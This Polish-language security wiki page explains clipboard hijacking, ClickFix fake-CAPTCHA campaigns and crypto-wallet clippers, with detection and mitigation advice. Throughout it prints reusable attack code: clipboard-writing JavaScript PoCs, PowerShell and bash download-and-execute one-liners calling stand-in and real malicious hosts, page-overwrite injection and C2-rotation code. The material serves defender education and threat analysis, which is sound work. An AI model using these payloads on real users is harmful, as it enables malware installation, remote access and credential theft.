# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> „Nigdy nie wklejaj niczego, czego samodzielnie nie skopiowałeś.” – stara, ale wciąż aktualna rada

## Przegląd

Clipboard hijacking – znane również jako *pastejacking* – wykorzystuje fakt, że użytkownicy regularnie kopiują i wklejają polecenia bez sprawdzania ich treści. Złośliwa strona internetowa (lub dowolny kontekst obsługujący JavaScript, taki jak aplikacja Electron lub Desktop) programowo umieszcza w schowku systemowym tekst kontrolowany przez atakującego. Ofiary są zachęcane, zwykle za pomocą starannie przygotowanych instrukcji socjotechnicznych, do naciśnięcia **Win + R** (okno Uruchamianie), **Win + X** (Quick Access / PowerShell) albo otwarcia terminala i *wklejenia* zawartości schowka, co natychmiast wykonuje dowolne polecenia.

Ponieważ **nie jest pobierany żaden plik ani otwierany żaden załącznik**, technika ta omija większość zabezpieczeń poczty e-mail i treści internetowych, które monitorują załączniki, makra lub bezpośrednie wykonywanie poleceń. Dlatego atak ten jest popularny w kampaniach phishingowych dostarczających powszechnie dostępne rodziny malware, takie jak NetSupport RAT, loader Latrodectus czy Lumma Stealer.<sup>[[1]](#references)</sup>

## Clipperty podmieniające adresy portfeli

Inny wariant **clipboard hijacking** w ogóle nie wkleja poleceń: czeka, aż ofiara skopiuje **adres portfela kryptowalutowego**, a następnie po cichu podmienia go na adres kontrolowany przez atakującego tuż przed wklejeniem. Jest to szczególnie skuteczne w przypadku długich formatów adresów portfeli, ponieważ użytkownicy często sprawdzają tylko pierwsze i ostatnie znaki.<sup>[[8]](#references)</sup>

Typowe cechy spotykane w rzeczywistych atakach:
- **Lekki loader + zagnieżdżony payload**: widoczna aplikacja/exe wygląda jak legalne narzędzie do handlu lub „zarabiania”, podczas gdy właściwy clipper jest ukryty głębiej w pakiecie (na przykład loader .NET uruchamia zagnieżdżony payload Rust).
- **Podmiana oparta na regexach**: malware dopasowuje ciągi takie jak `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` lub nawet ogólne ciągi **44-znakowe przypominające adresy Solana**, po czym podmienia je na portfele atakującego.
- **Masowa rotacja portfeli**: nowoczesne próbki dla Windows mogą zawierać **tysiące** zastępczych portfeli dla każdej waluty zamiast jednego statycznego adresu, ograniczając spadek reputacji portfela po każdej kradzieży.<sup>[[8]](#references)</sup>

### Przebieg działania clippera w Windows

Powszechną implementacją jest ukryte okno zarejestrowane za pomocą **`AddClipboardFormatListener`**. Przy każdej aktualizacji schowka malware zazwyczaj wywołuje:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → dostęp do bieżących danych schowka.
- **`GetClipboardData`** → odczyt tekstu.
- **`EmptyClipboard`** + **`SetClipboardData`** → podmiana ciągu z adresem portfela na wartość atakującego.

Minimalne regexy często spotykane w clipperach:

```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```

Utrwalenie na poziomie użytkownika wystarcza, by wywołać skutki. Zaobserwowano między innymi taki schemat:<sup>[[8]](#references)</sup>
- Skopiowanie payloadu do **`%APPDATA%\silke\silke.exe`**
- Utworzenie pliku **LNK w folderze Startup** w `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Pomysły na wykrywanie:
- Procesy, które nieustannie wywołują API schowka, a jednocześnie zapisują pliki w `%APPDATA%` i folderze **Startup** użytkownika.
- Utworzenie nowego pliku LNK/pliku wykonywalnego, po którym następuje podmiana adresu portfela w schowku.
- Archiwa lub pakiety z fałszywym oprogramowaniem zawierające wiele nieużywanych plików oraz mały launcher uruchamiający zagnieżdżony plik binarny.

### Socjotechniczne usunięcie kwarantanny w macOS + utrwalenie przez LaunchAgent

W macOS niektóre kampanie dostarczają pomocniczy plik **`unlocker.command`** i instruują ofiarę, by kliknęła prawym przyciskiem myszy → **Otwórz**, jeśli Gatekeeper informuje, że aplikacja jest uszkodzona lub pochodzi od niezidentyfikowanego dewelopera. Skrypt po prostu usuwa kwarantannę i uruchamia znajdujący się obok plik `.app`:<sup>[[8]](#references)</sup>

```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```

To **nie** jest exploit Gatekeepera; to **obejście kwarantanny oparte na inżynierii społecznej**, które wykorzystuje fakt, że decyzje Gatekeepera zależą od atrybutu xattr `com.apple.quarantine`.<sup>[[8]](#references)</sup>

Po uruchomieniu clipper może utrwalić się na koncie bieżącego użytkownika, zapisując:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – skrypt wrapper
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent z `RunAtLoad` i `KeepAlive`

Warto pamiętać z perspektywy obrony, że niektóre próbki implementują **samonaprawiający się watchdog**, który co około 30 sekund ponownie zapisuje LaunchAgent i wrapper. Jeśli najpierw usuniesz plist **bez zabicia działającego procesu**, malware może natychmiast go odtworzyć.<sup>[[8]](#references)</sup> Bezpieczna kolejność usuwania:
1. Zabij aktywny proces clippera.
2. Wyładuj/usuń plist LaunchAgenta.
3. Usuń `~/launch.sh` i skopiowany payload.

### Uwaga dotycząca dostarczania: fałszywa reputacja jako mnożnik siły

W przypadku tej rodziny malware może pozostać technicznie proste, a **warstwa dystrybucji** wykonuje większość pracy: fałszywe gwiazdki/forki na GitHubie, recenzje/pobrania na SourceForge, komentarze/wyświetlenia pod samouczkami na YouTube oraz wyglądające na niewinne komentarze/głosy w VirusTotal służą temu, by binarny plik wydawał się godny zaufania przed uruchomieniem.<sup>[[8]](#references)</sup>

## Wymuszanie użycia przycisków kopiowania i ukryte payloady (jednowierszowe polecenia macOS)

Niektóre infostealery na macOS klonują strony instalacyjne (np. Homebrew) i **wymuszają użycie przycisku „Copy”**, aby użytkownicy nie mogli zaznaczyć tylko widocznego tekstu. Zawartość schowka obejmuje oczekiwane polecenie instalacyjne oraz dołączony payload Base64 (np. `...; echo <b64> | base64 -d | sh`), więc jedno wklejenie uruchamia oba elementy, podczas gdy interfejs ukrywa dodatkowy etap.<sup>[[5]](#references)</sup>

## Proof-of-Concept w JavaScript

```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
  const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
  navigator.clipboard.writeText(payload)
    .then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```

Starsze kampanie używały `document.execCommand('copy')`, nowsze polegają na asynchronicznym **Clipboard API** (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Przebieg ClickFix / ClearFake

1. Użytkownik odwiedza witrynę z literówką w domenie lub witrynę, która została zaatakowana (np. `docusign.sa[.]com`)
2. Wstrzyknięty kod JavaScript **ClearFake** wywołuje funkcję pomocniczą `unsecuredCopyToClipboard()`, która po cichu zapisuje w schowku jednolinijkowe polecenie PowerShell zakodowane w Base64.
3. Instrukcje HTML informują ofiarę: *„Naciśnij **Win + R**, wklej polecenie i naciśnij Enter, aby rozwiązać problem.”*
4. `powershell.exe` uruchamia się i pobiera archiwum zawierające legalny plik wykonywalny oraz złośliwą bibliotekę DLL (klasyczny DLL sideloading).
5. Loader odszyfrowuje kolejne etapy, wstrzykuje shellcode i instaluje mechanizm utrzymywania dostępu (np. zaplanowane zadanie) – ostatecznie uruchamia NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Przykładowy łańcuch NetSupport RAT

```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```

* `jp2launcher.exe` (legalny Java WebStart) przeszukuje swój katalog w poszukiwaniu `msvcp140.dll`.
* Złośliwy DLL dynamicznie rozwiązuje API za pomocą **GetProcAddress**, pobiera dwa pliki binarne (`data_3.bin`, `data_4.bin`) przez **curl.exe**, odszyfrowuje je przy użyciu rotacyjnego klucza XOR `"https://google.com/"`, wstrzykuje końcowy shellcode i rozpakowuje **client32.exe** (NetSupport RAT) do `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader

```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```

1. Pobiera `la.txt` za pomocą **curl.exe**
2. Uruchamia downloader JScript w **cscript.exe**
3. Pobiera payload MSI → umieszcza `libcef.dll` obok podpisanej aplikacji → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer przez MSHTA

```
mshta https://iplogger.co/xxxx =+\\xxx
```

Wywołanie **mshta** uruchamia ukryty skrypt PowerShell, który pobiera `PartyContinued.exe`, wypakowuje `Boat.pst` (CAB), odtwarza `AutoIt3.exe` za pomocą `extrac32` i konkatenacji plików, a na końcu uruchamia skrypt `.a3x`, który eksfiltruje dane logowania z przeglądarki do `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix: Schowek → PowerShell → eval JS → LNK w autostarcie z rotującym C2 (PureHVNC)

Niektóre kampanie ClickFix całkowicie pomijają pobieranie plików i instruują ofiary, by wkleiły jednolinijkowe polecenie, które pobiera i wykonuje JavaScript za pośrednictwem WSH, zapewnia trwałość i codziennie zmienia C2. Przykład zaobserwowanego łańcucha:<sup>[[3]](#references)</sup>

```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new 
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```

Kluczowe cechy
- Obfuskowany URL jest odwracany w czasie działania, aby utrudnić pobieżną analizę.
- JavaScript utrwala się za pomocą Startup LNK (WScript/CScript) i wybiera C2 na podstawie bieżącego dnia — umożliwiając szybką rotację domen.<sup>[[3]](#references)</sup>

Minimalny fragment JS używany do rotacji C2 na podstawie daty:<sup>[[3]](#references)</sup>
```js
function getURL() {
    var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
    var current_datetime = new Date().getTime();
    var no_days = getDaysDiff(0, current_datetime);
    return 'https://'
        + getListElement(C2_domain_list, no_days)
        + '/Y/?t=' + current_datetime
        + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```

Kolejny etap często wdraża loader, który zapewnia persistence i pobiera RAT (np. PureHVNC), często przypinając TLS do zakodowanego na stałe certyfikatu i dzieląc ruch na fragmenty.<sup>[[3]](#references)</sup>

Pomysły na wykrywanie specyficzne dla tego wariantu
- Drzewo procesów: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (lub `cscript.exe`).
- Artefakty autostartu: LNK w `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, uruchamiający WScript/CScript ze ścieżką do pliku JS w `%TEMP%`/`%APPDATA%`.
- Telemetria rejestru/RunMRU i wiersza poleceń zawierająca `.split('').reverse().join('')` lub `eval(a.responseText)`.
- Powtarzające się polecenia `powershell -NoProfile -NonInteractive -Command -` z dużymi ładunkami stdin, służące do przekazywania długich skryptów bez używania długich wierszy poleceń.
- Scheduled Tasks, które następnie uruchamiają LOLBins, takie jak `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`, z zadania/ścieżki wyglądających na związane z aktualizatorem (np. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Nazwy hostów C2 i adresy URL zmieniane codziennie, zgodne ze wzorcem `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Korelowanie zdarzeń zapisu do schowka, po których następuje wklejenie przez Win+R, a następnie natychmiastowe uruchomienie `powershell.exe`.

Zespoły Blue Team mogą łączyć telemetrię schowka, tworzenia procesów i rejestru, aby precyzyjnie wykrywać nadużycia pastejacking:

* Rejestr Windows: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` przechowuje historię poleceń **Win + R** – szukaj nietypowych wpisów Base64 / obfuskowanych.
* Zdarzenie zabezpieczeń o identyfikatorze **4688** (tworzenie procesu), w którym `ParentImage` == `explorer.exe`, a `NewProcessName` należy do { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Zdarzenie o identyfikatorze **4663** dotyczące tworzenia plików w `%LocalAppData%\Microsoft\Windows\WinX\` lub folderach tymczasowych tuż przed podejrzanym zdarzeniem 4688.
* Czujniki schowka EDR (jeśli dostępne) – koreluj `Clipboard Write` bezpośrednio poprzedzające uruchomienie nowego procesu PowerShell.

## Strony weryfikacyjne w stylu IUAM (ClickFix Generator): kopiowanie ze schowka do konsoli + ładunki zależne od systemu operacyjnego

Najnowsze kampanie masowo generują fałszywe strony weryfikacyjne CDN/przeglądarki („Just a moment…”, w stylu IUAM), które nakłaniają użytkowników do skopiowania poleceń zależnych od systemu operacyjnego ze schowka do natywnych konsol. Przenosi to wykonanie poza piaskownicę przeglądarki i działa zarówno w Windows, jak i macOS.<sup>[[4]](#references)</sup>

Najważniejsze cechy stron generowanych przez builder
- Wykrywanie systemu operacyjnego za pomocą `navigator.userAgent` w celu dostosowania ładunków (Windows PowerShell/CMD vs. macOS Terminal). Opcjonalne przynęty/no-op dla nieobsługiwanych systemów operacyjnych, podtrzymujące iluzję.
- Automatyczne kopiowanie do schowka po nieszkodliwych działaniach w interfejsie (zaznaczenie pola/Copy), podczas gdy widoczny tekst może różnić się od zawartości schowka.
- Blokowanie urządzeń mobilnych i wyskakujące okienko z instrukcjami krok po kroku: Windows → Win+R→wklej→Enter; macOS → otwórz Terminal→wklej→Enter.
- Opcjonalna obfuskacja i jednoplikiowy injector, który nadpisuje DOM zaatakowanej witryny interfejsem weryfikacyjnym stylizowanym za pomocą Tailwind (bez konieczności rejestrowania nowej domeny).<sup>[[4]](#references)</sup>

Przykład: rozbieżność między schowkiem a tekstem + rozgałęzianie zależne od systemu operacyjnego
```html
<div class="space-y-2">
  <label class="inline-flex items-center space-x-2">
    <input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
  </label>
  <div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
  // UI shows a harmless string, but clipboard gets the real command
  navigator.clipboard.writeText(real).then(()=>{
    document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
  });
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```

Trwałość macOS przy pierwszym uruchomieniu
- Użyj `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`, aby wykonywanie było kontynuowane po zamknięciu terminala, ograniczając widoczne ślady.<sup>[[4]](#references)</sup>

Przejęcie strony bezpośrednio na zaatakowanych witrynach
```html
<script>
(async () => {
  const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
  document.documentElement.innerHTML = html;                 // overwrite DOM
  const s = document.createElement('script');
  s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
  document.head.appendChild(s);
})();
</script>
```

Pomysły na wykrywanie i threat hunting dotyczące przynęt w stylu IUAM
- Web: strony wiążące Clipboard API z widżetami weryfikacyjnymi; niezgodność między wyświetlanym tekstem a zawartością schowka; rozgałęzienia `navigator.userAgent`; Tailwind + podmiana strony w aplikacji jednostronicowej w podejrzanych kontekstach.
- Endpointy Windows: `explorer.exe` → `powershell.exe`/`cmd.exe` krótko po interakcji z przeglądarką; instalatory batch/MSI uruchamiane z `%TEMP%`.
- Endpointy macOS: Terminal/iTerm uruchamiające `bash`/`curl`/`base64 -d` z `nohup` w pobliżu zdarzeń związanych z przeglądarką; zadania działające w tle mimo zamknięcia terminala.
- Koreluj historię Win+R z `RunMRU` i zapisy do schowka z późniejszym tworzeniem procesów konsolowych.

Zobacz także techniki uzupełniające

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Ewolucje fałszywych CAPTCHA / ClickFix z 2026 r. (ClearFake, Scarlet Goldfinch)

- ClearFake nadal przejmuje witryny WordPress i wstrzykuje JavaScript loadera, który łączy się z zewnętrznymi hostami (Cloudflare Workers, GitHub/jsDelivr), a nawet wywołuje blockchainowe „etherhiding” (np. wysyła żądania POST do endpointów API Binance Smart Chain, takich jak `bsc-testnet.drpc[.]org`), aby pobrać aktualną logikę przynęty. Ostatnie nakładki intensywnie wykorzystują fałszywe CAPTCHA, które instruują użytkowników, by skopiowali i wkleili jednowierszowe polecenie (T1204.004), zamiast cokolwiek pobierać.<sup>[[6]](#references)</sup>
- W coraz większym stopniu początkowe wykonanie jest delegowane do podpisanych hostów skryptów/LOLBAS. W łańcuchach ze stycznia 2026 r. wcześniejsze użycie `mshta` zastąpiono wbudowanym `SyncAppvPublishingServer.vbs`, uruchamianym przez `WScript.exe` z argumentami przypominającymi PowerShell, zawierającymi aliasy/wildcardy, aby pobierać zdalną zawartość:<sup>[[6]](#references)</sup>

```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```

  - `SyncAppvPublishingServer.vbs` jest podpisany i standardowo używany przez App-V; w połączeniu z `WScript.exe` i nietypowymi argumentami (aliasami `gal`/`gcm`, poleceniami cmdlet z symbolami wieloznacznymi, adresami URL jsDelivr) staje się charakterystycznym etapem LOLBAS wykorzystywanym przez ClearFake.<sup>[[6]](#references)</sup>
- W lutym 2026 r. ładunki z fałszywym CAPTCHA ponownie zaczęły wykorzystywać wyłącznie mechanizmy pobierania oparte na PowerShellu. Dwa aktywne przykłady:<sup>[[6]](#references)</sup>

```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```

  - Pierwszy łańcuch to grabber `iex(irm ...)` działający w pamięci; drugi pobiera plik za pomocą `WinHttp.WinHttpRequest.5.1`, zapisuje tymczasowy plik `.ps1`, a następnie uruchamia go z `-ep bypass` w ukrytym oknie.<sup>[[6]](#references)</sup>

Wskazówki dotyczące wykrywania i threat huntingu dla tych wariantów
- Łańcuch procesów: przeglądarka → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` lub cradles PowerShell bezpośrednio po zapisaniu danych do schowka / użyciu Win+R.
- Słowa kluczowe w wierszu poleceń: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, domeny jsDelivr/GitHub/Cloudflare Worker lub wzorce z surowym adresem IP `iex(irm ...)`.
- Sieć: ruch wychodzący do hostów CDN worker lub punktów końcowych blockchain RPC z hostów skryptów/PowerShell krótko po przeglądaniu sieci.
- Pliki/rejestr: tworzenie tymczasowego pliku `.ps1` w `%TEMP%` oraz wpisy RunMRU zawierające te jednolinijkowe polecenia; blokuj/zgłaszaj uruchamianie LOLBAS przez podpisane skrypty (WScript/cscript/mshta), jeśli używają zewnętrznych adresów URL lub zaciemnionych ciągów aliasów.

## Taktyki ClickFix z czerwca 2026 r.: telemetria wklejania, fałszywe komentarze weryfikacyjne i łańcuchy LOLBin

Najnowsza telemetria Red Canary wskazuje, że stałym wskaźnikiem **nie jest jedno konkretne polecenie**, lecz połączenie **wklejenia i uruchomienia z pomocą użytkownika**, **zaufanych interpreterów/LOLBins**, **zaciemnionych flag**, **zdalnego pobierania** i **natychmiastowego wykonania**.<sup>[[7]](#references)</sup>

### Charakterystyczne wzorce działania operatorów

- **Telemetria potwierdzenia wklejenia**: niektóre payloady wywołują `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` przed właściwym etapem. Potwierdza to interakcję użytkownika, a jednocześnie pozwala zachować krótkie i dyskretne okno działania.
- **Fałszywe komentarze weryfikacyjne**: jednolinijkowe polecenia PowerShell mogą dopisywać ciągi takie jak `# Security check ✔️ I'm not a robot Verification ID: 138105`, aby po wklejeniu do okna Uruchamianie / historii `cmd.exe` / PowerShell polecenie nadal wyglądało na związane z CAPTCHA.
- **Dynamiczne odtwarzanie adresu URL**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` pozwala uniknąć umieszczania stałego adresu URL w wierszu poleceń, a jednocześnie umożliwia pobranie i wykonanie w pamięci.
- **Uruchamianie instalatora podszywającego się pod oryginał**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` wykorzystuje nietypową wielkość liter i znaki podobne do Unicode we flagach, aby omijać kruche mechanizmy wykrywania, nadal przypominając `msiexec.exe`.
- **Łańcuchy LOLBin z maskowaniem znakami daszka**: `cmd.exe` może ukrywać słowa kluczowe za pomocą znaków ucieczki `^` (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), uruchamiać zagnieżdżoną powłokę w postaci zminimalizowanej, zapisywać treści atakującego pod nieszkodliwym rozszerzeniem, takim jak `.pdf`, a następnie uruchamiać je za pomocą `mshta`.<sup>[[7]](#references)</sup>
## Środki zaradcze

1. Utwardzanie przeglądarki – wyłącz możliwość zapisu do schowka (`dom.events.asyncClipboard.clipboardItem` itp.) lub wymagaj gestu użytkownika.
2. Świadomość bezpieczeństwa – ucz użytkowników, aby *wpisywali* wrażliwe polecenia lub najpierw wklejali je do edytora tekstu.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control, aby blokować dowolne jednolinijkowe polecenia.
4. Kontrole sieciowe – blokuj ruch wychodzący do znanych domen pastejackingowych i domen C2 malware.

## Powiązane sztuczki

* **Przejmowanie zaproszeń Discord** często wykorzystuje to samo podejście ClickFix po zwabieniu użytkowników na złośliwy serwer:
  
{{#ref}}
  discord-invite-hijacking.md
  {{#endref}}

## References

- [1] [Napraw kliknięcie: zapobieganie wektorowi ataku ClickFix](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Za czystą kurtyną: od RAT-a przez buildera po programistę](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [Fabryka ClickFix: pierwsze ujawnienie generatora IUAM ClickFix](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025 – rok infostealerów](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – spostrzeżenia wywiadowcze: luty 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – spostrzeżenia wywiadowcze: czerwiec 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – od gwiazdek do głosów: fałszywa reputacja napędza przechwytujący schowek kryptowalutowy](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
